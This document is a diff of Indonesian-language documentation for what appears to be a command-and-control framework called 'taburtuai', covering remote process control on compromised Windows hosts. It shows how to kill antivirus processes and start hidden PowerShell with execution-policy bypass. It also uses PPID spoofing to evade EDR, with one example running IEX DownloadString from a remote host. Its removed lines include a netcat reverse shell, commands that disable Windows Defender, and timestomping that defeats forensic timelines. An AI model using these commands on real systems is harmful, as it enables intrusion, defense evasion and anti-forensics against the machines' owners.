@@ -2,203 +2,232 @@
 
 ## List Proses
 
-### `process list <id>`
-
-Tampilkan semua proses yang berjalan di target.
+Tampilkan semua proses yang berjalan di target beserta informasi PID, parent, user, dan memory.
 
 ```
-taburtuai(IP:PORT) › process list 2703886d
+taburtuai(IP:8000) › process list 2703886d
 ```
 
+**Output:**
 ```
-[+] Process list (DESKTOP-QLPBF95):
+[+] Process list for DESKTOP-QLPBF95 (2703886d):
 
-PID    PPID   NAME                    USER                    SESSION
------------------------------------------------------------------------
-4      0      System                  NT AUTHORITY\SYSTEM     0
-88     4      Registry                NT AUTHORITY\SYSTEM     0
-...
-724    656    lsass.exe               NT AUTHORITY\SYSTEM     0
-864    724    svchost.exe             NT AUTHORITY\SYSTEM     0
-1284   864    MsMpEng.exe             NT AUTHORITY\SYSTEM     0
-2164   864    RuntimeBroker.exe       DESKTOP-QLPBF95\windows 1
-3048   2792   explorer.exe            DESKTOP-QLPBF95\windows 1
-4512   3048   chrome.exe              DESKTOP-QLPBF95\windows 1
-5824   1      cmd.exe                 DESKTOP-QLPBF95\windows 1
-...
+PID    PPID   NAME                         USERNAME              MEM (MB)
+-----  -----  ---------------------------  --------------------  --------
+4      0      System                       SYSTEM                0.1
+88     4      Registry                     SYSTEM                47.2
+456    4      smss.exe                     SYSTEM                0.4
+580    572    csrss.exe                    SYSTEM                4.2
+648    640    winlogon.exe                 SYSTEM                5.3
+724    620    lsass.exe                    SYSTEM                12.4
+868    804    svchost.exe                  SYSTEM                14.2
+976    804    svchost.exe                  NETWORK SERVICE       8.1
+1024   804    svchost.exe                  LOCAL SERVICE         6.5
+1248   804    MsMpEng.exe                  SYSTEM                156.3
+2048   804    spoolsv.exe                  SYSTEM                9.7
+3048   3016   explorer.exe                 john.doe              82.4
+3124   3048   chrome.exe                   john.doe              245.6
+3456   3048   OneDrive.exe                 john.doe              34.2
+3788   3048   Taskmgr.exe                  john.doe              18.9
+4512   3048   agent_windows_stealth.exe    john.doe              8.2
 ```
 
-### Analisis dari Process List
-
-**Proses yang dicari saat post-exploitation:**
+### Filter Berdasarkan Nama
 
 ```
-# Security products
-MsMpEng.exe        ← Windows Defender
-SentinelAgent.exe  ← SentinelOne
-CylanceSvc.exe     ← Cylance
-CrowdStrike*       ← CrowdStrike Falcon
-MBAMService.exe    ← Malwarebytes
+taburtuai(IP:8000) › process list 2703886d --filter lsass
+```
 
-# Proses menarik untuk injection target
-explorer.exe       ← User session, stabil
-RuntimeBroker.exe  ← Trusted Microsoft process
-spoolsv.exe        ← Print Spooler (SYSTEM)
-svchost.exe        ← Generic host (banyak instance)
+**Output:**
+```
+PID    PPID   NAME       USERNAME   MEM (MB)
+724    620    lsass.exe  SYSTEM     12.4
+```
 
-# Proses yang menunjukkan aktifitas user
-chrome.exe / firefox.exe / msedge.exe  ← Browser aktif
-outlook.exe        ← Email client terbuka
-WINWORD.EXE        ← Word sedang buka
+### Format JSON untuk Parsing
+
+```
+taburtuai(IP:8000) › process list 2703886d --format json
+```
+
+**Output:**
+```json
+[
+  {
+    "pid": 724,
+    "ppid": 620,
+    "name": "lsass.exe",
+    "username": "SYSTEM",
+    "mem_mb": 12.4,
+    "path": "C:\\Windows\\System32\\lsass.exe"
+  },
+  ...
+]
 ```
 
 ---
 
 ## Kill Proses
 
-### Kill Berdasarkan PID
+Terminate proses berdasarkan PID.
 
 ```
-taburtuai(IP:PORT) › process kill 2703886d --pid 4512
+taburtuai(IP:8000) › process kill 2703886d --pid 3788 --wait
 ```
 
+**Output:**
 ```
-[+] Process 4512 (chrome.exe) terminated.
-```
-
-### Kill Berdasarkan Nama
-
-```
-taburtuai(IP:PORT) › process kill 2703886d --name chrome.exe
+[*] Terminating process PID 3788 (Taskmgr.exe)...
+[+] Process 3788 terminated.
 ```
 
-```
-[+] Killed 2 process(es) named 'chrome.exe'.
-```
-
-### Contoh Kill Proses
+### Kill AV/EDR Process (Butuh Privilege yang Tepat)
 
 ```
-# Matikan AV (butuh elevated privilege)
-process kill 2703886d --name MsMpEng.exe
-process kill 2703886d --pid 1284
+# Cari PID antivirus
+taburtuai(IP:8000) › process list 2703886d --filter MsMpEng
 
-# Matikan proses user yang mungkin deteksi kita
-process kill 2703886d --name procexp64.exe   # Process Explorer
-process kill 2703886d --name Wireshark.exe   # Wireshark
-
-# Matikan aplikasi yang sedang lock file yang ingin kita akses
-process kill 2703886d --name WINWORD.EXE
+# Kill
+taburtuai(IP:8000) › process kill 2703886d --pid 1248 --wait
 ```
 
-> **Catatan:** Mematikan security product butuh elevated privilege (admin/SYSTEM).
-> Tanpa privilege yang cukup, perintah akan gagal.
+**Output (gagal karena protected process):**
+```
+[!] Failed to terminate PID 1248: Access is denied.
+[i] MsMpEng.exe adalah Protected Process Light (PPL) — tidak bisa di-kill langsung.
+[i] Gunakan token escalation atau PPL bypass terlebih dahulu.
+```
+
+**Output (berhasil setelah escalate):**
+```
+[+] Process 1248 terminated.
+```
 
 ---
 
 ## Start Proses
 
-### `process start <id> <exe-path>`
-
-Jalankan binary baru di target.
+Jalankan proses baru di target.
 
 ```
-taburtuai(IP:PORT) › process start 2703886d "C:\Windows\System32\calc.exe"
+taburtuai(IP:8000) › process start 2703886d \
+  --path "C:\Windows\System32\cmd.exe" \
+  --args "/c whoami > C:\Temp\out.txt" \
+  --hidden \
+  --wait
 ```
 
+**Output:**
 ```
-[+] Process started: calc.exe (PID: 6720)
+[*] Starting process: C:\Windows\System32\cmd.exe /c whoami > C:\Temp\out.txt
+[+] Process started (PID: 6720)
 ```
 
-### Contoh Start Proses
+### Start PowerShell Tersembunyi
 
 ```
-# Jalankan calc sebagai test
-process start 2703886d "C:\Windows\System32\calc.exe"
+taburtuai(IP:8000) › process start 2703886d \
+  --path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
+  --args "-w hidden -ep bypass -f C:\Users\Public\enum.ps1" \
+  --hidden \
+  --wait
+```
 
-# Jalankan tool yang sudah diupload
-process start 2703886d "C:\Temp\nc.exe" --args "172.23.0.118 4444 -e cmd.exe"
-
-# Jalankan PowerShell hidden
-process start 2703886d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
-  --args "-w hidden -ep bypass -f C:\Temp\script.ps1"
+**Output:**
+```
+[+] Process started (PID: 7832) — running in background
 ```
 
 ---
 
-## Skenario: Identifikasi EDR dan Tindakan
+## PPID Spoofing — Spawn Proses dengan Parent Palsu
 
-### Langkah 1: List Proses untuk Cari Security Product
+Buat proses dengan parent process yang berbeda untuk menghindari deteksi berbasis
+process tree. EDR sering menganalisis parent-child chain untuk deteksi.
 
-```
-taburtuai(IP:PORT) › process list 2703886d
-# Perhatikan proses yang berjalan
-```
-
-### Langkah 2: Identifikasi EDR
+### Tanpa Spoofing (Mudah Dideteksi)
 
 ```
-# Filter dari shell
-cmd 2703886d "tasklist | findstr /i \"defender crowdstrike sentinel cylance endpoint carbon\""
+agent.exe (PID 4512, john.doe)
+  └─► cmd.exe (PID 6720)     ← ALERT: cmd lahir dari agent yang tidak dikenal
+        └─► powershell.exe
 ```
 
-### Langkah 3: Tindakan Berdasarkan EDR
+### Dengan PPID Spoofing
 
-**Windows Defender (tanpa EDR tambahan):**
 ```
-# Disable via PowerShell (butuh admin)
-cmd 2703886d "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring \$true\""
-cmd 2703886d "powershell -c \"Add-MpPreference -ExclusionPath C:\Temp\""
+explorer.exe (PID 3048, john.doe)
+  └─► cmd.exe (PID 6720)     ← Normal: cmd lahir dari explorer seperti biasa
+        └─► powershell.exe
 ```
 
-**EDR yang lebih advanced:**
-Lebih baik gunakan teknik evasion daripada coba matikan EDR:
-- Lihat [11 — Evasion](11-evasion.md) untuk AMSI/ETW bypass
-- Lihat [10 — Injection](10-injection.md) untuk inject ke trusted process
+### Spawn dengan Parent explorer.exe
+
+```
+taburtuai(IP:8000) › inject ppid 2703886d \
+  --exe "C:\Windows\System32\cmd.exe" \
+  --ppid-name explorer.exe \
+  --wait
+```
+
+**Output:**
+```
+[*] Finding PID for explorer.exe...
+[*] Found: PID 3048 (explorer.exe, john.doe)
+[*] Spawning cmd.exe with PPID=3048...
+[+] Process started: cmd.exe (PID: 6720) | Parent: explorer.exe (3048)
+```
+
+### Spawn PowerShell Tersembunyi dengan Parent svchost
+
+```
+taburtuai(IP:8000) › inject ppid 2703886d \
+  --exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
+  --args "-w hidden -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.5.3/script.ps1')" \
+  --ppid-name svchost.exe \
+  --wait
+```
+
+**Output:**
+```
+[*] Spoofing parent to svchost.exe (PID: 976)...
+[+] powershell.exe (PID: 8924) spawned under svchost.exe (PID: 976)
+```
+
+### Spawn dengan PID Langsung
+
+```
+# Pakai PID spesifik, bukan nama
+taburtuai(IP:8000) › inject ppid 2703886d \
+  --exe "C:\Windows\System32\calc.exe" \
+  --ppid 3048 \
+  --wait
+```
 
 ---
 
-## Timestomp — Manipulasi Timestamp File
+## Skenario: Enumeration Proses untuk Injection Target
 
-Ganti timestamp file agar terlihat seperti file lama yang bukan baru dibuat.
-Berguna untuk menyembunyikan tool yang baru diupload dari forensik timeline analysis.
-
-### `timestomp <id> <target-file>`
+Sebelum injection, identifikasi proses yang cocok:
 
 ```
-# Copy timestamp dari kernel32.dll (file sistem yang legitimate)
-timestomp 2703886d "C:\Temp\tool.exe"
+taburtuai(IP:8000) › process list 2703886d
 ```
 
-```
-[+] Timestamps copied from C:\Windows\System32\kernel32.dll
-    Modified : 2019-12-07 09:14:00 (was 2026-04-23 16:30:00)
-    Created  : 2019-12-07 09:14:00 (was 2026-04-23 16:29:58)
-    Accessed : 2019-12-07 09:14:00 (was 2026-04-23 16:30:01)
-```
+Cari proses yang:
+1. **Stabil** — tidak sering ditutup user (explorer.exe, svchost.exe, RuntimeBroker.exe)
+2. **Privilege sesuai** — sama atau lebih tinggi dari yang dibutuhkan
+3. **Tidak ter-monitor** — bukan MsMpEng.exe, tidak dikaitkan langsung ke aktivitas mencurigakan
 
-### Menggunakan File Referensi Lain
+**Proses rekomendasi injection:**
 
-```
-# Copy timestamp dari file explorer.exe
-timestomp 2703886d "C:\Temp\tool.exe" --ref "C:\Windows\explorer.exe"
-
-# Copy dari file yang punya tanggal spesifik
-timestomp 2703886d "C:\Temp\tool.exe" --ref "C:\Windows\System32\notepad.exe"
-```
-
-### Set Timestamp Eksplisit
-
-```
-# Set timestamp ke tanggal spesifik
-timestomp 2703886d "C:\Temp\tool.exe" --time "2021-06-15T09:00:00Z"
-```
-
-### Kenapa Penting
-
-Forensic analyst sering melihat timeline: semua file dengan timestamp yang sama atau
-baru = mencurigakan. Dengan timestomp, file tool kamu terlihat seperti file lama
-yang sudah ada sebelum engagement dimulai.
+| Proses | Keterangan |
+|--------|------------|
+| `explorer.exe` | Selalu ada, user context, stabil |
+| `RuntimeBroker.exe` | Microsoft trusted, medium integrity |
+| `svchost.exe` | Banyak instance, sulit dianalisis |
+| `spoolsv.exe` | SYSTEM context, selalu berjalan |
+| `dllhost.exe` | COM surrogate, sering spawned normal |
 
 ---
 
